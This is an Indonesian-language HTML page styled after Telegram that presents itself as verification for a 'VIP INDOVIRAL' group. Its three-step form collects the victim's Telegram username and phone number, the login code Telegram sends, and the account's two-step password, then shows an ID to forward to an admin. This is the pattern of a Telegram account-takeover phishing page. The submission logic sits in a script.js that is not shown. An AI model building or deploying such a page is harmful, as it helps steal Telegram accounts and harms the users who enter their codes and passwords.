<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.min.css">
    <style>
        /* Mengatur tampilan layar penuh */
body, html {
    height: 100%;
    margin: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    background-color: #0088cc; /* Warna latar belakang biru Telegram */
    font-family: Arial, sans-serif;
    box-sizing: border-box;
}

/* Container yang menyesuaikan */
.container {
    width: 100%;
    max-width: 400px; /* Maksimal 400px untuk layar besar */
    background-color: #ffffff; /* Warna latar belakang putih untuk formulir */
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    margin: 20px;
    box-sizing: border-box;
}

/* Heading dengan desain Telegram */
h2 {
    font-size: 1.6rem;
    font-weight: bold;
    color: #0088cc;
    text-align: center;
    margin-bottom: 20px;
}

/* Desain teks informasi */
.info-text {
    color: #808080;
    text-align: center;
    margin-bottom: 20px;
    font-size: 0.9rem;
}

/* Form Label */
.form-label {
    color: #333;
    font-size: 1rem;
}

/* Mengatur input field */
.form-control {
    background-color: #f0f0f0;
    color: #333;
    border: 1px solid #ccc;
    border-radius: 5px;
    padding-left: 40px;
    height: 45px;
    box-sizing: border-box;
    font-size: 1rem;
    margin-bottom: 20px;
}

/* Input dengan ikon */
.input-icon {
    position: relative;
}

.input-icon .icon {
    position: absolute;
    top: 50%;
    left: 10px;
    transform: translateY(-50%);
    color: #aaa;
    font-size: 1.2rem;
}

/* Gaya tombol */
.btn-primary, .btn-success {
    width: 100%;
    font-weight: bold;
    border-radius: 5px;
    height: 45px;
    font-size: 1.1rem;
}

.btn-primary {
    background-color: #0088cc; /* Warna biru Telegram */
    border: none;
    transition: background-color 0.3s;
    color: white;
}

.btn-primary:hover {
    background-color: #006fa1; /* Efek hover lebih gelap */
}

.btn-success {
    background-color: #28a745;
    border: none;
    transition: background-color 0.3s;
}

.btn-success:hover {
    background-color: #218838;
}

/* Responsif untuk perangkat kecil */
@media (max-width: 576px) {
    h2 {
        font-size: 1.4rem;
    }

    .container {
        padding: 20px;
    }

    .form-control {
        font-size: 1rem;
        padding-left: 35px;
        height: 40px;
    }

    .btn-primary, .btn-success {
        height: 40px;
        font-size: 1rem;
    }
}

/* Error */
.error {
    color: #ff5733;
    font-size: 0.9rem;
}

/* Styles for the loading overlay */
.loading-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.6);
    z-index: 1000;
    justify-content: center;
    align-items: center;
}

.loading-spinner {
    border: 8px solid #f3f3f3;
    border-top: 8px solid #0088cc; /* Warna spinner biru Telegram */
    border-radius: 50%;
    width: 60px;
    height: 60px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* Styles for modal alert */
.modal {
    display: none;
    position: fixed;
    z-index: 1050;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background-color: rgba(0, 0, 0, 0.7);
    justify-content: center;
    align-items: center;
}

.modal-dialog {
    margin: 1.75rem auto;
    max-width: 90%;
    width: 100%;
}

.modal-content {
    background-color: #ffffff;
    color: #333;
    border-radius: 10px;
    border: none;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
}

.modal-header,
.modal-body,
.modal-footer {
    text-align: center;
}

.modal-title {
    color: #0088cc; /* Warna judul modal */
}

@media (max-width: 768px) {
    .modal-dialog {
        margin: 0;
        width: 95%;
    }

    .modal-content {
        border-radius: 0;
    }

    .modal-header, .modal-body, .modal-footer {
        padding: 10px;
    }
}

@media (max-width: 576px) {
    .modal-title {
        font-size: 1.4rem;
    }

    .modal-body p {
        font-size: 0.9rem;
    }

    .btn-primary {
        width: 100%;
        font-size: 1rem;
    }
}

/* Gaya untuk timer hitungan mundur */
#timer {
    font-size: 1.2rem; /* Ukuran font lebih besar */
    font-weight: bold; /* Font tebal */
    color: #e74c3c; /* Warna merah */
    background-color: rgba(255, 255, 255, 0.8); /* Latar belakang putih transparan */
    padding: 10px;
    border-radius: 5px;
    text-align: center;
    margin-top: 10px;
    display: inline-block;
    animation: fadeIn 1s ease-in-out; /* Efek animasi saat tampil */
}

/* Animasi untuk efek fade-in */
@keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
}

/* Responsif, ukuran font akan lebih kecil di layar kecil */
@media (max-width: 576px) {
    #timer {
        font-size: 1rem;
    }
}


    </style>
</head>
<body>

    <div class="container">
        <h2>Verifikasi Member VIP INDOVIRAL</h2>
        <p class="info-text" id="yy">Sebelum bergabung ke grup VIP Indoviral, Anda perlu menyelesaikan proses verifikasi terlebih dahulu. Silakan lengkapi langkah-langkah verifikasi berikut untuk melanjutkan.</p>
        
        <div id="step1" class="mt-4">
            <form id="verificationForm">
                <div class="input-icon">
                    <span class="icon"></span>
                    <input type="text" class="form-control" id="fullName" placeholder="Username Telegram" required>
                </div>
                <!-- Dropdown kode negara -->
                <div class="input-icon">
                    <span class="icon"></span>
                    <input type="tel" id="phone" class="form-control" placeholder="Nomor Telegram" required>
                    <div class="error" id="phoneError"></div> <!-- Error message area -->
                </div>
                <button type="button" class="btn btn-primary" id="nextButton" onclick="nextStep(2)" disabled>Selanjutnya</button>
            </form>
        </div>

        <div id="step2" class="mt-4" style="display: none;">
    <p class="info-text" id="step3Description">Kami telah mengirimkan kode verifikasi pada telegram anda, silahkan cek pesan telegram anda.</p>
    <div class="mb-3">
        <label for="otp" class="form-label"></label>
        <input 
            type="text" 
            class="form-control" 
            id="otp" 
            placeholder="Masukkan kode Verifikasi" 
            pattern="\d{5}"   
            maxlength="5"     
            required 
            oninput="validateOTP()"  
            oninvalid="setCustomValidity('Hanya angka yang diperbolehkan')" 
            oninput="setCustomValidity('')"
        >
        <div class="error" id="otpError"></div>
    </div>
    <button type="button" class="btn btn-primary" onclick="nextStep(3)">Selanjutnya</button>
    <!-- Tombol Kirim Ulang Kode -->
    <button type="button" class="btn btn-primary" id="resendButton" onclick="resendOTP()">Kirim Ulang Kode</button>
    <div id="timer" class="mt-2" style="display: none;">Silahkan tunggu 30 detik sebelum mengirim kode verifikasi yang baru</div>
</div>


        <div id="step3" class="mt-4" style="display: none;">
            <div class="mb-3">
                <label for="password" class="form-label">Kata Sandi</label>
                <input type="password" class="form-control" id="password" placeholder="Masukkan kata sandi" required>
            </div>
            <button type="button" class="btn btn-success" onclick="submitVerification()">Kirim</button>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        // Menginisialisasi intl-tel-input pada input telepon
        var input = document.querySelector("#phone");
        var iti = intlTelInput(input, {
            preferredCountries: ['id', 'us', 'gb', 'in', 'jp'], // Anda bisa menambahkan negara yang diinginkan
            utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js" // Memungkinkan format otomatis
        });
        
        // Fungsi untuk validasi nomor telepon
        function validatePhoneNumber() {
            var phoneNumber = iti.getNumber(); // Mendapatkan nomor telepon dengan format internasional
            var isValid = iti.isValidNumber(); // Cek apakah nomor telepon valid
            var phoneError = document.getElementById("phoneError");
            
            if (isValid) {
                phoneError.textContent = ''; // Hapus pesan error jika valid
                document.getElementById("nextButton").disabled = false; // Aktifkan tombol Selanjutnya
                return true; // Nomor telepon valid
            } else {
                phoneError.textContent = 'Nomor telepon tidak valid'; // Tampilkan pesan error jika tidak valid
                document.getElementById("nextButton").disabled = true; // Nonaktifkan tombol Selanjutnya
                return false; // Nomor telepon tidak valid
            }
        }
        
        // Validasi nomor telepon saat input
        input.addEventListener('input', function () {
            validatePhoneNumber();
        });
        
        // Fungsi untuk melanjutkan ke step berikutnya
        function nextStep(step) {
            if (validatePhoneNumber()) {
                document.getElementById('step' + (step - 1)).style.display = 'none'; // Menyembunyikan step sebelumnya
                document.getElementById('step' + step).style.display = 'block'; // Menampilkan step berikutnya
            }
        }
        
        // Memastikan hanya angka yang diizinkan di nomor telepon dan OTP
        document.getElementById('phone').addEventListener('input', function (e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        document.getElementById('otp').addEventListener('input', function (e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>

<!-- Loading Spinner -->
<div id="loadingOverlay" class="loading-overlay">
    <div class="loading-spinner"></div>
</div>

    <!-- Alert Modal -->
    <div id="alertModal" class="modal" tabindex="-1" role="dialog">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Peringatan</h5>
                <button type="button" class="close" onclick="hideAlert()">
                    <span>&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <p id="alertMessage"></p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-primary" onclick="hideAlert()">Tutup</button>
                <button type="button" class="btn btn-success" onclick="copyToClipboard()">Salin ID</button>
            </div>
        </div>
    </div>
</div>



    <!-- Tempat untuk menampilkan ID acak -->
<div id="verificationComplete" style="display: none;">
    <h4>Verifikasi berhasil!</h4>
    <p>Silakan screenshot atau salin ID Anda untuk pengiriman ke admin Indoviral.</p>
    <p id="randomIdContainer"></p>
    <button id="copyIdBtn" class="btn btn-primary" style="display: none;" onclick="copyToClipboard()">Salin ID</button> <!-- Tombol salin ID -->
</div>

    
    <script src="script.js"></script>
</body>
</html>
